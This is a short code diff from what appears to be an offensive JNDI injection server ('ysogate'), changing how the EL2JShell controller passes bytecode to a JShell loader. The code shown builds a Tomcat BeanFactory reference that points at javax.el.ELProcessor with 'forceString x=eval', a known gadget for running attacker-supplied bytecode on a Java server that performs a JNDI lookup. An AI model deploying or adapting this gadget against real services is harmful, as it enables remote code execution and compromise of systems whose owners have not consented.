@@ -5,8 +5,7 @@ import com.h2tg.ysogate.annotation.JNDIMapping;
 import com.h2tg.ysogate.controller.BasicController;
 import org.apache.naming.ResourceRef;
 import javax.naming.StringRefAddr;
-import java.util.Base64;
-import static com.h2tg.ysogate.controller.bypass.EvalConverter.LoadByJshell;
+import static com.h2tg.ysogate.controller.bypass.converter.EvalConverter.LoadByJshell;
 
 @JNDIController
 @JNDIMapping("/EL2JShell")
@@ -16,8 +15,7 @@ public class EL2JShellController extends BasicController {
         byte[] byteCode = (byte[]) obj;
         System.out.println("[Reference] Factory: BeanFactory + ELProcessor");
 
-        String b64Str = Base64.getEncoder().encodeToString(byteCode);
-        String code = LoadByJshell(b64Str);
+        String code = LoadByJshell(byteCode);
 
         ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "x=eval"));
